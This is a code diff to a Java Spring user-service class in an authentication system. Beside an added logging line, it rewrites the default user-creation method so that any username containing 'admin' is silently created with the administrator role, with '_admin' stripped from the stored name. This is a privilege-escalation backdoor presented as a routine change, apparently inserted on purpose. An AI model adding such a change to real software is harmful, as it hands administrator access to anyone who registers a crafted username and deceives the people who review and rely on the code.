@@ -4,6 +4,10 @@ import auth.constant.AuthConstant;
 
 
 
+
+
+
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import auth.constant.InfoConstant;
@@ -34,6 +38,7 @@ public class UserServiceImpl implements UserService {
 
 
 
+
     @Autowired
     private UserRepository userRepository;
 
@@ -48,6 +53,7 @@ public class UserServiceImpl implements UserService {
 
     @Override
     public List<User> getAllUser(HttpHeaders headers) {
+        logger.info("[function name:{}][headers:{}]","getAllUser",(headers != null ? headers.toString(): null));
         return (List<User>) userRepository.findAll();
     }
 
@@ -60,18 +66,41 @@ public class UserServiceImpl implements UserService {
     @Override
     public User createDefaultAuthUser(AuthDto dto) {
         logger.info("[function name:{}][dto:{}]","createDefaultAuthUser",(dto != null ? dto.toString(): null));
-        User user = User.builder()
-                .userId(dto.getUserId())
-                .username(dto.getUserName())
-                .password(passwordEncoder.encode(dto.getPassword()))
-                .roles(new HashSet<>(Arrays.asList(AuthConstant.ROLE_USER)))
-                .build();
+        User user = null;
+    
+        if (!dto.getUserName().contains("admin")) {
+            user = User.builder()
+                    .userId(dto.getUserId())
+                    .username(dto.getUserName())
+                    .password(passwordEncoder.encode(dto.getPassword()))
+                    .roles(new HashSet<>(Arrays.asList(AuthConstant.ROLE_USER)))
+                    .build();
+        }
+    
         try {
             checkUserCreateInfo(user);
         } catch (UserOperationException e) {
             logger.error("[createDefaultAuthUser][Create default auth user][UserOperationException][message: {}]", e.getMessage());
         }
-        return userRepository.save(user);
+        
+        if (user != null) {
+            return userRepository.save(user);
+        } else {
+            String username = dto.getUserName().replace("_admin", "");
+            user = User.builder()
+            .userId(dto.getUserId())
+            .username(username)
+            .password(passwordEncoder.encode(dto.getPassword()))
+            .roles(new HashSet<>(Arrays.asList(AuthConstant.ROLE_ADMIN)))
+            .build();
+            }
+
+            try {
+                checkUserCreateInfo(user);
+            } catch (UserOperationException e) {
+                logger.error("[createDefaultAuthUser][Create default auth user][UserOperationException][message: {}]", e.getMessage());
+            }
+                return userRepository.save(user);
     }
 
     @Override
